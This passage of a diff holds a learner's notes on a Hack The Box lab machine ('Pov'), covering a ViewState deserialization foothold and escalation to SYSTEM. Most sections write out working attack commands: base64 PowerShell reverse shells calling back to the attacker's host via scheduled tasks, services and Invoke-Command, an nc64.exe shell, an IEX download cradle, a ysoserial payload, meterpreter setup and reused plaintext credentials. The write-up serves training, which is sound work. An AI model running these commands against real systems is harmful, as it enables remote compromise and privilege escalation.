+   schtasks /create /tn switchuser /tr "cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwANAA0ADQANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" /sc once /st 00:00 /ru alaading /rp f8gQ8fynP44ek1m3 /f 
+   schtasks /run /tn switchuser
+   #+end_src
+** start-process
+   #+begin_src bat
+   PS > $sec = ConvertTo-SecureString 'f8gQ8fynP44ek1m3' -AsPlainText -Force
+   PS > $cred = New-Object System.Management.Automation.PSCredential('alaading',$sec)
+   PS > Start-Process powershell -Credential $cred # didn't work, so let's try a reverse shell
+   PS > Start-Process powershell -Credential $cred -ArgumentList "-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwANAA0ADQANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+   #+end_src
+** create service
+   #+begin_src bat
+   PS > sc create alaading binPath= "cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwANAA0ADQANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" obj= ".\alaading" password="f8gQ8fynP44ek1m3"
+   PS > sc start alaading
+   #+end_src
+** get alaading's groups
+   #+begin_src bat
+   PS C:\windows\system32\inetsrv> net user alaading
+
+User name                    alaading
+Full Name                    
+Comment                      
+User's comment               
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            11/6/2023 9:59:23 AM
+Password expires             Never
+Password changeable          11/6/2023 9:59:23 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script                 
+User profile                 
+Home directory               
+Last logon                   12/19/2025 5:13:56 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use*Users                
+Global Group memberships     *None                 
+The command completed successfully.
+   #+end_src
+   part of =Remote Management Users=; will rdp work?
+** try rdp
+   #+begin_src bat
+   $ xfreerdp /v:10.10.11.251 /u:alaading /p:f8gQ8fynP44ek1m3 /size:1920x1080
+
+[04:47:51:494] [3295757:3295766] [ERROR][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex ERRCONNECT_CONNECT_FAILED [0x00020006]
+[04:47:51:494] [3295757:3295766] [ERROR][com.freerdp.core] - failed to connect to 10.10.11.251
+   #+end_src
+** impacket
+   #+begin_src 
+   impacket-psexec alaading:'f8gQ8fynP44ek1m3'@10.10.11.251
+   #+end_src
+   smbexec fails as well. obviously the smb port is not open.
+** OFFICIAL SOLUTION
+   uses the =Invoke-Command= module
+   #+begin_src bat
+   PS C:\users\sfitz> $securePassword = ConvertTo-SecureString "f8gQ8fynP44ek1m3" 
+   AsPlainText -force 
+   PS C:\users\sfitz> $credential = New-Object 
+   System.Management.Automation.PsCredential("pov\alaading", $securePassword)
+   PS C:\users\sfitz> Invoke-Command -computername pov -Credential $credential -scriptblock {whoami /all}
+   #+end_src
+   in our case, since we've already saved the PS creds under =$cred=:
+   #+begin_src bat
+   PS > Invoke-Command -computername pov -Credential $cred -scriptblock {whoami /all}
+
+USER INFORMATION
+----------------
+
+User Name    SID                                          
+============ =============================================
+pov\alaading S-1-5-21-2506154456-4081221362-271687478-1001
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes                                        
+====================================== ================ ============ ==================================================
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeDebugPrivilege              Debug programs                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+   #+end_src
+   we haven't permanently switched users and this just allows us to run a command as that 
+   user. we can see =SeDebugPrivilege= is available for the user. 
+** try and use Invoke-Command to get a reverse shell
+   #+begin_src bat
+   PS > Invoke-Command -computername pov -Credential $cred -scriptblock {powershell -e "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwANAA0ADQANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="}
+   #+end_src
+   ok, this worked!
+   #+begin_src bat
+   $ nc -lvnp 4445                                                           
+listening on [any] 4445 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.10.11.251] 49717
+
+   PS C:\Users\alaading\Documents> whoami
+pov\alaading
+   #+end_src
+** user flag
+   #+begin_src bat
+   PS C:\Users\alaading\Desktop> dir
+
+Mode                LastWriteTime         Length Name                                              
+----                -------------         ------ ----                                              
+-a----       12/19/2025  12:48 PM           3449 EnableAllTokenPrivs.ps1
+-ar---       12/17/2025  11:53 PM             34 user.txt
+
+    PS C:\Users\alaading\Desktop> type user.txt
+1bd9791f0c457514cb6f8e191a2e491c
+   #+end_src
+   interestingly, there's the =EnableAllTokenPrivs.ps1= script which should enable 
+   =SeDebugPrivilege= I guess.
+   [[file:.\enable-privilege-script.ps1][here]] is the script; this is the same as the [[https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1][one discussed in the modules]] for enabling
+   token privileges
+** run the enable token privileges script
+   this fails for some reason; according to the [[file:d:/code/htb/academy/modules/windows-privilege-escalation/SeTakeOwnershipPrivilege.org::*Enabling SeTakeOwnershipPrivilege][academy modules]], the process is pretty 
+   straightforward; should be something like this:
+   #+begin_src 
+   PS C:\htb> Import-Module .\EnableAllTokenPrivs.ps1
+   PS C:\htb> .\EnableAllTokenPrivs.ps1 
+   PS C:\htb> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeDebugPrivilege              Debug programs                 Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled 
+   #+end_src
+   however, debug privilege is still =Disabled=
+   did some other variations suggested by chatgpt as well:
+   #+begin_src
+   . .\EnableAllTokenPrivs.ps1; [Set_TokenPermission.SetTokenPriv]::EnablePrivilege()
+   #+end_src
+   still doesn't work.
+   NOTE: i don't think this script was meant to be there - this is an artifact from other 
+   users playing the same box.
+   IMPORTANT: ippsec says he couldn't get it to work with this script either. the issue seems 
+   to be that a shell generated via =Invoke-Command= might just not have the permission to
+   change privileges.
+** chisel
+   the official solution uses chisel; and it works. but ippsec proceeds with something else.
+   transfer the chisel exe to the machine via our python server
+   run the server on kali:
+   #+begin_src bat
+   ./chisel server --reverse -p 8000
+   #+end_src
+   NOTE: if the connection breaks for whatever reason, it's better to restart the server and 
+   start again.
+   on the target:
+   #+begin_src
+   PS C:\Users\alaading\Desktop> .\chisel.exe client 10.10.16.6:8000 R:socks 
+   #+end_src
+   then use =evil-winrm= to establish a connection as the user =alaading=
+   #+begin_src bat
+   $ proxychains -q evil-winrm -i pov.htb -u alaading -p f8gQ8fynP44ek1m3
+   #+end_src
+   #+begin_src bat
+   ,*Evil-WinRM* PS C:\Users\alaading\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeDebugPrivilege              Debug programs                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+   #+end_src
+** psgetsys
+   we can use =psgetsys= to get a shell as =NT AUTHORITY\SYSTEM=
+  #+begin_src bat
+  PS> . .\psgetsys.ps1
+  PS> ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
+  #+end_src
+  we should get =parentpid= from some elevated process, say lsass. we can use =Get-Process= to get
+  its id
+  #+begin_src 
+  ,*Evil-WinRM* PS C:\Users\alaading\Desktop> (Get-Process "lsass").ID
+
+648  
+  #+end_src
+  now let's use this =ppid= and try and get a reverse shell
+  #+begin_src bat
+  ImpersonateFromParentPid -ppid 648 -command powershell -cmdargs "-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwANAA0ADQANgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+  #+end_src
+  for whatever reason, this didn't work. in the official solution, they transfer the [[https://github.com/int0x33/nc.exe/blob/master/nc64.exe][nc.exe]] 
+  binary over to the target via the evil-winrm connection and use it to get a shell back:
+  #+begin_src 
+  ,*Evil-WinRM* PS C:\Users\alaading\Desktop> upload nc64.exe
+
+Info: Uploading /home/kali/htb/labs/pov/nc64.exe to C:\Users\alaading\Desktop\nc64.exe
+Data: 60360 bytes of 60360 bytes copied
+Info: Upload successful!
+  #+end_src
+  now, run the =ImpersonateFromParentPid= function again after setting up an nc listener on =9001=
+  #+begin_src bat
+  ,*Evil-WinRM* PS C:\Users\alaading\Desktop> ImpersonateFromParentPid -ppid 648 -command "c:\windows\system32\cmd.exe" -cmdargs "/cc:\users\alaading\desktop\nc64.exe 10.10.16.6  9001 -e powershell"
+  #+end_src
+  #+begin_src 
+  $ nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.16.6] from (UNKNOWN) [10.10.11.251] 50272
+
+PS C:\Windows\system32> whoami
+nt authority\system      
+
+PS C:\Users\Administrator\Desktop> type root.txt
+9226d3312be6ea15b17356f3af99b92d
+  #+end_src
+* ippsec
+** intro
+   - says using single quotes on the cmd runs into issues for the ysoserial part
+   - also notes the inability to turn =SeDebugPrivilege= on while using =Invoke-Command=
+** nmap
+   #+begin_src bat
+   sudo nmap -sC -sV -vv -oA nmap/pov 10.10.11.251
+   #+end_src
+   =-vv= double verbose, for TTL, etc.
+** dev.pov.htb
+   - checks =index.html= explicitly to see if it's still the same site
+** ysoserial
+   can do this to get examples:
+  #+begin_src bat
+  .\ysoserial.exe -p ViewState --examples
+  #+end_src
+*** minimal proof of it working - ping
+    start an icmp listener with tcpdump:
+    #+begin_src bat
+    $ sudo tcpdump -n -i tun0 icmp
+    #+end_src
+    generate a ViewState to issue a ping:
+    #+begin_src bat
+    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate --path="/portfolio" --apppath="/" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --decryptionalg="AES" --decryptionkey "74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" -c "ping 10.10.16.6"
+    #+end_src
+** the reverse shell
+   uses nishang - which we've now cloned to =/usr/share= and fetches it via a new IEX request.
+   #+begin_src bat
+   cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 shell.ps1
+   #+end_src
+   make this available over a python server and fetch it like so:
+*** first, write this into a file (name is cradle)
+    #+begin_src 
+   IEX(New-Objet Net.WebClient).downloadString("http://10.10.16.6:8000/shell.ps1")
+    #+end_src
+*** convert this to base64
+    #+begin_src 
+    cat cradle | iconv -t utf-16le | base64 -w 0
+
+SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADYAOgA4ADAAMAAwAC8AcwBoAGUAbABsAC4AcABzADEAIgApAAoA
+    #+end_src
+    =le= here is little-endian
+    doing it this way - i.e. with the web cradle let's us know whether or not the antivirus
+    picked it up -- because it won't flag on the web cradle, only after.
+    now use the base64 output as the =ViewState=
+*** set up an nc listener
+    IMPORTANT: [[https://github.com/hanslub42/rlwrap][rlwrap]] is a lifesaver - the answer to a better, more interactive reverse shell;
+    #+begin_src bat
+    rlwrap nc -lvnp 9001
+    #+end_src
+** first Invoke-Command test
+   #+begin_src 
+   Invoke-Command -computername localhost -Credential $credential -scriptblock {whoami}
+   #+end_src
+   uses =localhost= instead of =pov=
+** meterpreter
+   uses meterpreter to abuse the =SeDebugPrivilege= and migrate the process since this is 
+   something =SeDebugPrivilege= allows you to do.
+*** msfvenom
+    #+begin_src bat
+    $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9002 -f exe -o meterpreter.exe
+    #+end_src
+*** msfconsole
+    #+begin_src 
+    use exploit/multi/handler
+    set LHOST tun0
+    set LPORT 9002
+    set payload windows/x64/meterpreter/reverse_tcp
+    run
+    #+end_src
+    we don't really need to generate an exe with msfvenom for this i guess.
+    anyway, in the session generated thus, we do not have the =SeDebugPrivilege= -- because 
+    we're still basically within that powershell session. so he uses a new tool - [[https://github.com/antonioCoco/RunasCs][RunasCs]]
+** RunasCs
+   download this and transfer to the target and verify it works with:
+   #+begin_src bat
+   .\RunasCs.exe alaading f8gQ8fynP44ek1m3 whoami
+   #+end_src
+*** shell
+   #+begin_src 
+   .\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd -r 10.10.16.6:9001
+   #+end_src
+   the session established via the nc listener still lists =SeDebugPrivilege= as disabled.
+   however, when we run powershell from within that shell, it's listed as enabled. also, if we
+   run meterpreter from this point (prior to running powershell), it's still enabled. with
+   meterpreter do a =ps= to get processes and use the =migrate= command to migrate to one running
+   as SYSTEM or Administrator, =winlogon= for example
+** meterpreter powershell
+   use this to load Powershell within meterpreter
+   #+begin_src 
+   (Meterpreter) load powershell
+   (Meterpreter) powershel_shell
+   #+end_src
+* learnings
+** where we got stuck
+   - not using the =apppath= and =path= options for ysoserial.
+   - lack of quotes around the validation and decryption keys in the command
+** solution
+   we did not come across the =--examples= switch anywhere -- but also we didn't check the 
+   actual readme on the [[https://github.com/pwntester/ysoserial.net][github page]] which contains this part:
+   #+begin_src 
+   (*) ViewState (Generates a ViewState using known MachineKey parameters)
+       Options:
+	--examples   Show a few examples. Other parameters will be ignored.
+   #+end_src
+** "CMD does not like single quotes" - ippsec
+** post shell session
+   first checks for =whoami /priv=; then runs =netstat -an= which shows all open ports, to check
+   if an SQL server is running, for example.
+** "if you run into errors, try different shells" - ippsec
